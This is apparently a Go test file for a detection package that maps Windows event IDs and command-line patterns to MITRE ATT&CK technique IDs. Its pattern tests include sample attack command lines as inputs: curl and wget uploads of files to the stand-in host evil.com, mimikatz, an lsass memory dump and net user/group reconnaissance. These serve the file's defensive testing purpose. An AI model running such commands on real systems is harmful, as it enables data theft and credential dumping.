package attck

import (
	"testing"
)

func TestEventIDMapping(t *testing.T) {
	tests := []struct {
		eventID    string
		wantCount  int
		wantHasID  string
	}{
		{"4625", 1, "T1110"},
		{"4648", 1, "T1550"},
		{"4672", 1, "T1548"},
		{"4688", 1, "T1059"},
		{"4698", 1, "T1053"},
		{"4663", 1, "T1070"},
		{"4660", 1, "T1070.004"},
		{"4657", 1, "T1112"},
		{"4768", 1, "T1558"},
		{"4769", 1, "T1558"},
		{"5156", 1, "T1021"},
		{"1074", 1, "T1562"},
		{"7045", 1, "T1053"},
		{"7036", 1, "T1562"},
		{"4626", 1, "T1087"},
		{"4634", 1, "T1110"},
	}

	for _, tt := range tests {
		t.Run("EventID_"+tt.eventID, func(t *testing.T) {
			techniques := MapEventByEventID(tt.eventID)
			if len(techniques) != tt.wantCount {
				t.Errorf("EventID %s: got %d techniques, want %d", tt.eventID, len(techniques), tt.wantCount)
			}
			if len(techniques) > 0 && techniques[0].ID != tt.wantHasID {
				t.Errorf("EventID %s: got technique %s, want %s", tt.eventID, techniques[0].ID, tt.wantHasID)
			}
		})
	}
}

func TestPatternMatching(t *testing.T) {
	tests := []struct {
		name        string
		commandLine string
		processName string
		wantHasID   string
	}{
		{"mimikatz", "mimikatz.exe", "", "T1003"},
		{"kerberos ticket", "kerberos ticket request", "", "T1003"},
		{"lsass access", "lsass.exe memory dump", "", "T1003"},
		{"net user", "net user admin", "", "T1087"},
		{"net group", "net group domain admins", "", "T1087"},
		{"xcopy", "xcopy C:\\data \\\\server\\share", "", "T1005"},
		{"robocopy", "robocopy /mir C:\\data \\\\server\\share", "", "T1005"},
		{"curl upload", "curl -T file.txt http://evil.com/upload", "", "T1048"},
		{"wget post", "wget --post-file=data.txt http://evil.com", "", "T1048"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			techniques := MapEventByPatterns(tt.commandLine, tt.processName)
			if len(techniques) == 0 {
				t.Errorf("Pattern %s: no techniques matched", tt.name)
				return
			}
			found := false
			for _, tech := range techniques {
				if tech.ID == tt.wantHasID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Pattern %s: expected technique %s not found in %v", tt.name, tt.wantHasID, techniques)
			}
		})
	}
}

func TestMappingCoverage(t *testing.T) {
	all := AllTechniques()
	if len(all) < 10 {
		t.Errorf("AllTechniques() returned %d techniques, want >= 10", len(all))
	}
	t.Logf("Total unique techniques: %d", len(all))
}

func TestDeduplication(t *testing.T) {
	techniques := MapEventToTechniques("4625", "authentication", "mimikatz.exe", "lsass.exe")
	seen := make(map[string]bool)
	for _, tech := range techniques {
		if seen[tech.ID] {
			t.Errorf("Duplicate technique ID: %s", tech.ID)
		}
		seen[tech.ID] = true
	}
}

func TestUnknownEventID(t *testing.T) {
	techniques := MapEventByEventID("99999")
	if len(techniques) != 0 {
		t.Errorf("Unknown EventID: got %d techniques, want 0", len(techniques))
	}
}
